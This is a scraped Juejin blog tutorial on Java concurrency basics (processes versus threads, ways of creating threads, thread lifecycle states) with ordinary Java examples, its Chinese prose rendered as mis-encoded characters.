content="Javaå¹¶å‘ç¼–ç¨‹åŸºç¡€ä¸è¿›é˜¶ï¼ˆçº¿ç¨‹Â·é”Â·åŸå­ç±»Â·é€šä¿¡ï¼‰"/> <meta itemprop="keywords" content="å‰ç«¯,é¢è¯•,Android"/> <meta itemprop="datePublished" content="2026-01-08T02:09:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é’è²843"/> <meta itemprop="url" content="https://juejin.cn/user/541408646929991"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Javaå¹¶å‘ç¼–ç¨‹åŸºç¡€ä¸è¿›é˜¶ï¼ˆçº¿ç¨‹Â·é”Â·åŸå­ç±»Â·é€šä¿¡ï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/541408646929991/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é’è²843
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T02:09:20.000Z" title="Thu Jan 08 2026 02:09:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1å°æ—¶+
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ç¬¬ä¸€ç«  çº¿ç¨‹åŸºç¡€</h2>
<h3 data-id="heading-1">1.1 è¿›ç¨‹ä¸çº¿ç¨‹çš„æ¦‚å¿µ</h3>
<h4 data-id="heading-2">è¿›ç¨‹çš„å®šä¹‰å’Œç‰¹ç‚¹</h4>
<p>**è¿›ç¨‹ï¼ˆProcessï¼‰**æ˜¯æ“ä½œç³»ç»Ÿè¿›è¡Œèµ„æºåˆ†é…å’Œè°ƒåº¦çš„åŸºæœ¬å•ä½ã€‚æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰è‡ªå·±ç‹¬ç«‹çš„å†…å­˜ç©ºé—´ï¼ŒåŒ…æ‹¬ä»£ç æ®µã€æ•°æ®æ®µã€å †æ ˆæ®µç­‰ã€‚</p>
<p><strong>è¿›ç¨‹çš„ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li><strong>ç‹¬ç«‹æ€§</strong>ï¼šè¿›ç¨‹ä¹‹é—´ç›¸äº’ç‹¬ç«‹ï¼Œä¸€ä¸ªè¿›ç¨‹çš„å´©æºƒä¸ä¼šå½±å“å…¶ä»–è¿›ç¨‹</li>
<li><strong>èµ„æºéš”ç¦»</strong>ï¼šæ¯ä¸ªè¿›ç¨‹æ‹¥æœ‰ç‹¬ç«‹çš„åœ°å€ç©ºé—´ï¼Œè¿›ç¨‹é—´ä¸èƒ½ç›´æ¥è®¿é—®å¯¹æ–¹çš„å†…å­˜</li>
<li><strong>å¼€é”€å¤§</strong>ï¼šè¿›ç¨‹çš„åˆ›å»ºã€åˆ‡æ¢ã€é”€æ¯éƒ½éœ€è¦è¾ƒå¤§çš„ç³»ç»Ÿå¼€é”€</li>
<li><strong>é€šä¿¡å¤æ‚</strong>ï¼šè¿›ç¨‹é—´é€šä¿¡éœ€è¦é€šè¿‡IPCï¼ˆInter-Process Communicationï¼‰æœºåˆ¶ï¼Œå¦‚ç®¡é“ã€ä¿¡å·ã€å…±äº«å†…å­˜ç­‰</li>
</ul>
<h4 data-id="heading-3">çº¿ç¨‹çš„å®šä¹‰å’Œç‰¹ç‚¹</h4>
<p>**çº¿ç¨‹ï¼ˆThreadï¼‰**æ˜¯CPUè°ƒåº¦çš„åŸºæœ¬å•ä½ï¼Œæ˜¯è¿›ç¨‹å†…çš„ä¸€ä¸ªæ‰§è¡Œæµã€‚ä¸€ä¸ªè¿›ç¨‹å¯ä»¥åŒ…å«å¤šä¸ªçº¿ç¨‹ï¼Œè¿™äº›çº¿ç¨‹å…±äº«è¿›ç¨‹çš„å†…å­˜ç©ºé—´å’Œèµ„æºã€‚</p>
<p><strong>çº¿ç¨‹çš„ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li><strong>è½»é‡çº§</strong>ï¼šçº¿ç¨‹çš„åˆ›å»ºã€åˆ‡æ¢ã€é”€æ¯å¼€é”€æ¯”è¿›ç¨‹å°å¾—å¤š</li>
<li><strong>å…±äº«èµ„æº</strong>ï¼šåŒä¸€è¿›ç¨‹å†…çš„çº¿ç¨‹å…±äº«è¿›ç¨‹çš„å†…å­˜ç©ºé—´ã€æ–‡ä»¶æè¿°ç¬¦ç­‰èµ„æº</li>
<li><strong>å¹¶å‘æ‰§è¡Œ</strong>ï¼šå¤šä¸ªçº¿ç¨‹å¯ä»¥å¹¶å‘æ‰§è¡Œï¼Œæé«˜ç¨‹åºçš„æ‰§è¡Œæ•ˆç‡</li>
<li><strong>é€šä¿¡ç®€å•</strong>ï¼šçº¿ç¨‹é—´å¯ä»¥ç›´æ¥é€šè¿‡å…±äº«å†…å­˜è¿›è¡Œé€šä¿¡ï¼Œä½†éœ€è¦åŒæ­¥æœºåˆ¶ä¿è¯çº¿ç¨‹å®‰å…¨</li>
</ul>
<h4 data-id="heading-4">è¿›ç¨‹ä¸çº¿ç¨‹çš„åŒºåˆ«</h4>








































<table><thead><tr><th>å¯¹æ¯”é¡¹</th><th>è¿›ç¨‹</th><th>çº¿ç¨‹</th></tr></thead><tbody><tr><td><strong>èµ„æºæ‹¥æœ‰</strong></td><td>æ‹¥æœ‰ç‹¬ç«‹çš„åœ°å€ç©ºé—´å’Œèµ„æº</td><td>å…±äº«è¿›ç¨‹çš„åœ°å€ç©ºé—´å’Œèµ„æº</td></tr><tr><td><strong>åˆ›å»ºå¼€é”€</strong></td><td>å¤§ï¼ˆéœ€è¦åˆ†é…ç‹¬ç«‹çš„å†…å­˜ç©ºé—´ï¼‰</td><td>å°ï¼ˆå…±äº«è¿›ç¨‹èµ„æºï¼‰</td></tr><tr><td><strong>åˆ‡æ¢å¼€é”€</strong></td><td>å¤§ï¼ˆéœ€è¦åˆ‡æ¢åœ°å€ç©ºé—´ï¼‰</td><td>å°ï¼ˆåªéœ€åˆ‡æ¢ä¸Šä¸‹æ–‡ï¼‰</td></tr><tr><td><strong>é€šä¿¡æ–¹å¼</strong></td><td>éœ€è¦IPCæœºåˆ¶ï¼ˆç®¡é“ã€ä¿¡å·ç­‰ï¼‰</td><td>å¯ç›´æ¥é€šè¿‡å…±äº«å†…å­˜é€šä¿¡</td></tr><tr><td><strong>ç‹¬ç«‹æ€§</strong></td><td>å®Œå…¨ç‹¬ç«‹ï¼Œä¸€ä¸ªè¿›ç¨‹å´©æºƒä¸å½±å“å…¶ä»–è¿›ç¨‹</td><td>ç›¸äº’å½±å“ï¼Œä¸€ä¸ªçº¿ç¨‹å´©æºƒå¯èƒ½å¯¼è‡´æ•´ä¸ªè¿›ç¨‹å´©æºƒ</td></tr><tr><td><strong>æ•°é‡</strong></td><td>ç³»ç»Ÿèµ„æºæœ‰é™ï¼Œè¿›ç¨‹æ•°é‡è¾ƒå°‘</td><td>ä¸€ä¸ªè¿›ç¨‹å¯ä»¥åˆ›å»ºå¤§é‡çº¿ç¨‹</td></tr></tbody></table>
<h4 data-id="heading-5">å¤šè¿›ç¨‹ vs å¤šçº¿ç¨‹</h4>
<p><strong>å¤šè¿›ç¨‹çš„ä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li>æ›´å¥½çš„éš”ç¦»æ€§ï¼Œä¸€ä¸ªè¿›ç¨‹çš„å´©æºƒä¸ä¼šå½±å“å…¶ä»–è¿›ç¨‹</li>
<li>å¯ä»¥åˆ©ç”¨å¤šæ ¸CPUï¼Œå®ç°çœŸæ­£çš„å¹¶è¡Œ</li>
<li>é€‚åˆéœ€è¦é«˜ç¨³å®šæ€§çš„åœºæ™¯</li>
</ul>
<p><strong>å¤šçº¿ç¨‹çš„ä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li>åˆ›å»ºå’Œåˆ‡æ¢å¼€é”€å°ï¼Œæ€§èƒ½æ›´é«˜</li>
<li>çº¿ç¨‹é—´é€šä¿¡ç®€å•ï¼Œæ•°æ®å…±äº«æ–¹ä¾¿</li>
<li>é€‚åˆéœ€è¦é¢‘ç¹é€šä¿¡å’Œåä½œçš„åœºæ™¯</li>
</ul>
<p><strong>é€‰æ‹©å»ºè®®ï¼š</strong></p>
<ul>
<li>éœ€è¦é«˜éš”ç¦»æ€§ã€é«˜ç¨³å®šæ€§ â†’ é€‰æ‹©å¤šè¿›ç¨‹</li>
<li>éœ€è¦é¢‘ç¹é€šä¿¡ã€å…±äº«æ•°æ® â†’ é€‰æ‹©å¤šçº¿ç¨‹</li>
<li>ç°ä»£åº”ç”¨é€šå¸¸é‡‡ç”¨å¤šçº¿ç¨‹ + è¿›ç¨‹éš”ç¦»çš„æ··åˆæ¨¡å¼</li>
</ul>
<h3 data-id="heading-6">1.2 Javaçº¿ç¨‹çš„åˆ›å»ºæ–¹å¼</h3>
<h4 data-id="heading-7">æ–¹å¼ä¸€ï¼šç»§æ‰¿Threadç±»</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyThread</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Thread</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> {
        System.out.println(<span class="hljs-string">"çº¿ç¨‹æ‰§è¡Œ: "</span> + Thread.currentThread().getName());
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">MyThread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyThread</span>();
        thread.start(); <span class="hljs-comment">// å¯åŠ¨çº¿ç¨‹</span>
    }
}
</code></pre>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>ç®€å•ç›´æ¥ï¼Œé€‚åˆç®€å•çš„çº¿ç¨‹ä»»åŠ¡</li>
<li>Javaæ˜¯å•ç»§æ‰¿ï¼Œç»§æ‰¿Threadåæ— æ³•ç»§æ‰¿å…¶ä»–ç±»</li>
<li>ä¸æ¨èä½¿ç”¨ï¼Œå› ä¸ºè€¦åˆåº¦é«˜</li>
</ul>
<h4 data-id="heading-8">æ–¹å¼äºŒï¼šå®ç°Runnableæ¥å£ï¼ˆæ¨èï¼‰</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyRunnable</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Runnable</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> {
        System.out.println(<span class="hljs-string">"çº¿ç¨‹æ‰§è¡Œ: "</span> + Thread.currentThread().getName());
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MyRunnable</span>());
        thread.start();
    }
}
</code></pre>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>å®ç°æ¥å£ï¼Œå¯ä»¥ç»§æ‰¿å…¶ä»–ç±»ï¼Œæ›´çµæ´»</li>
<li>ç¬¦åˆé¢å‘æ¥å£ç¼–ç¨‹çš„åŸåˆ™</li>
<li>ä»»åŠ¡å’Œçº¿ç¨‹åˆ†ç¦»ï¼Œè€¦åˆåº¦ä½</li>
<li><strong>æ¨èä½¿ç”¨</strong></li>
</ul>
<h4 data-id="heading-9">æ–¹å¼ä¸‰ï¼šå®ç°Callableæ¥å£</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.util.concurrent.Callable;
<span class="hljs-keyword">import</span> java.util.concurrent.FutureTask;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyCallable</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Callable</span>&lt;String&gt; {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">call</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        Thread.sleep(<span class="hljs-number">1000</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-string">"ä»»åŠ¡æ‰§è¡Œå®Œæˆ: "</span> + Thread.currentThread().getName();
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception {
        FutureTask&lt;String&gt; futureTask = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FutureTask</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MyCallable</span>());
        <span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(futureTask);
        thread.start();
        
        <span class="hljs-comment">// è·å–è¿”å›å€¼</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> futureTask.get();
        System.out.println(result);
    }
}
</code></pre>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>å¯ä»¥æœ‰è¿”å›å€¼</li>
<li>å¯ä»¥æŠ›å‡ºå¼‚å¸¸</li>
<li>éœ€è¦é…åˆFutureTaskä½¿ç”¨</li>
<li>é€‚åˆéœ€è¦è¿”å›ç»“æœçš„å¼‚æ­¥ä»»åŠ¡</li>
</ul>
<h4 data-id="heading-10">æ–¹å¼å››ï¼šä½¿ç”¨çº¿ç¨‹æ± åˆ›å»º</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.util.concurrent.ExecutorService;
<span class="hljs-keyword">import</span> java.util.concurrent.Executors;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadPoolExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">ExecutorService</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> Executors.newFixedThreadPool(<span class="hljs-number">5</span>);
        
        executor.submit(() -&gt; {
            System.out.println(<span class="hljs-string">"çº¿ç¨‹æ± æ‰§è¡Œä»»åŠ¡: "</span> + Thread.currentThread().getName());
        });
        
        executor.shutdown();
    }
}
</code></pre>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>çº¿ç¨‹å¤ç”¨ï¼Œæ€§èƒ½æ›´å¥½</li>
<li>ç»Ÿä¸€ç®¡ç†çº¿ç¨‹ç”Ÿå‘½å‘¨æœŸ</li>
<li>æ§åˆ¶å¹¶å‘æ•°é‡</li>
<li><strong>ç”Ÿäº§ç¯å¢ƒæ¨èä½¿ç”¨</strong></li>
</ul>
<h4 data-id="heading-11">æ–¹å¼äº”ï¼šLambdaè¡¨è¾¾å¼åˆ›å»º</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LambdaThread</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// æ–¹å¼1ï¼šä½¿ç”¨Runnableçš„Lambdaè¡¨è¾¾å¼</span>
        <span class="hljs-type">Thread</span> <span class="hljs-variable">thread1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            System.out.println(<span class="hljs-string">"Lambdaçº¿ç¨‹: "</span> + Thread.currentThread().getName());
        });
        thread1.start();
        
        <span class="hljs-comment">// æ–¹å¼2ï¼šç›´æ¥ä½¿ç”¨çº¿ç¨‹æ± </span>
        <span class="hljs-type">ExecutorService</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> Executors.newCachedThreadPool();
        executor.submit(() -&gt; {
            System.out.println(<span class="hljs-string">"çº¿ç¨‹æ± Lambda: "</span> + Thread.currentThread().getName());
        });
        executor.shutdown();
    }
}
</code></pre>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>ä»£ç ç®€æ´</li>
<li>é€‚åˆç®€å•çš„ä»»åŠ¡</li>
<li>Java 8+æ”¯æŒ</li>
</ul>
<h3 data-id="heading-12">1.3 çº¿ç¨‹çš„ç”Ÿå‘½å‘¨æœŸ</h3>
<p>Javaçº¿ç¨‹æœ‰6ç§çŠ¶æ€ï¼Œå®šä¹‰åœ¨<code>Thread.State</code>æšä¸¾ä¸­ï¼š</p>
<h4 data-id="heading-13">NEWï¼ˆæ–°å»ºï¼‰</h4>
<p>çº¿ç¨‹è¢«åˆ›å»ºä½†å°šæœªå¯åŠ¨çš„çŠ¶æ€ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {});
System.out.println(thread.getState()); <span class="hljs-comment">// NEW</span>
</code></pre>
<h4 data-id="heading-14">RUNNABLEï¼ˆå¯è¿è¡Œï¼‰</h4>
<p>çº¿ç¨‹æ­£åœ¨JVMä¸­æ‰§è¡Œï¼Œä½†å¯èƒ½æ­£åœ¨ç­‰å¾…æ“ä½œç³»ç»Ÿåˆ†é…CPUæ—¶é—´ç‰‡ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>) {
        <span class="hljs-comment">// è¿è¡Œä¸­æˆ–ç­‰å¾…CPUæ—¶é—´ç‰‡</span>
    }
});
thread.start();
System.out.println(thread.getState()); <span class="hljs-comment">// RUNNABLE</span>
</code></pre>
<p><strong>æ³¨æ„ï¼š</strong> RUNNABLEçŠ¶æ€åŒ…æ‹¬ï¼š</p>
<ul>
<li><strong>Running</strong>ï¼šæ­£åœ¨æ‰§è¡Œ</li>
<li><strong>Ready</strong>ï¼šå°±ç»ªï¼Œç­‰å¾…CPUè°ƒåº¦</li>
</ul>
<h4 data-id="heading-15">BLOCKEDï¼ˆé˜»å¡ï¼‰</h4>
<p>çº¿ç¨‹è¢«é˜»å¡ï¼Œç­‰å¾…è·å–ç›‘è§†å™¨é”ï¼ˆmonitor lockï¼‰ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BlockedExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InterruptedException {
        <span class="hljs-type">Thread</span> <span class="hljs-variable">thread1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-keyword">synchronized</span> (lock) {
                <span class="hljs-keyword">try</span> {
                    Thread.sleep(<span class="hljs-number">5000</span>); <span class="hljs-comment">// æŒæœ‰é”5ç§’</span>
                } <span class="hljs-keyword">catch</span> (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        });
        
        <span class="hljs-type">Thread</span> <span class="hljs-variable">thread2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-keyword">synchronized</span> (lock) {
                <span class="hljs-comment">// ç­‰å¾…thread1é‡Šæ”¾é”</span>
            }
        });
        
        thread1.start();
        Thread.sleep(<span class="hljs-number">100</span>); <span class="hljs-comment">// ç¡®ä¿thread1å…ˆè·å–é”</span>
        thread2.start();
        Thread.sleep(<span class="hljs-number">100</span>);
        
        System.out.println(thread2.getState()); <span class="hljs-comment">// BLOCKED</span>
    }
}
</code></pre>
<h4 data-id="heading-16">WAITINGï¼ˆç­‰å¾…ï¼‰</h4>
<p>çº¿ç¨‹æ— é™æœŸç­‰å¾…å¦ä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œç‰¹å®šæ“ä½œã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WaitingExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InterruptedException {
        <span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-keyword">synchronized</span> (lock) {
                <span class="hljs-keyword">try</span> {
                    lock.wait(); <span class="hljs-comment">// è¿›å…¥WAITINGçŠ¶æ€</span>
                } <span class="hljs-keyword">catch</span> (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        });
        
        thread.start();
        Thread.sleep(<span class="hljs-number">100</span>);
        System.out.println(thread.getState()); <span class="hljs-comment">// WAITING</span>
    }
}
</code></pre>
<p><strong>è¿›å…¥WAITINGçŠ¶æ€çš„æ–¹æ³•ï¼š</strong></p>
<ul>
<li><code>Object.wait()</code> - ç­‰å¾…è¢«notify/notifyAllå”¤é†’</li>
<li><code>Thread.join()</code> - ç­‰å¾…ç›®æ ‡çº¿ç¨‹æ‰§è¡Œå®Œæˆ</li>
<li><code>LockSupport.park()</code> - ç­‰å¾…è¢«unparkå”¤é†’</li>
</ul>
<h4 data-id="heading-17">TIMED_WAITINGï¼ˆè¶…æ—¶ç­‰å¾…ï¼‰</h4>
<p>çº¿ç¨‹åœ¨æŒ‡å®šæ—¶é—´å†…ç­‰å¾…ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TimedWaitingExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InterruptedException {
        <span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-keyword">try</span> {
                Thread.sleep(<span class="hljs-number">5000</span>); <span class="hljs-comment">// è¿›å…¥TIMED_WAITINGçŠ¶æ€</span>
            } <span class="hljs-keyword">catch</span> (InterruptedException e) {
                e.printStackTrace();
            }
        });
        
        thread.start();
        Thread.sleep(<span class="hljs-number">100</span>);
        System.out.println(thread.getState()); <span class="hljs-comment">// TIMED_WAITING</span>
    }
}
</code></pre>
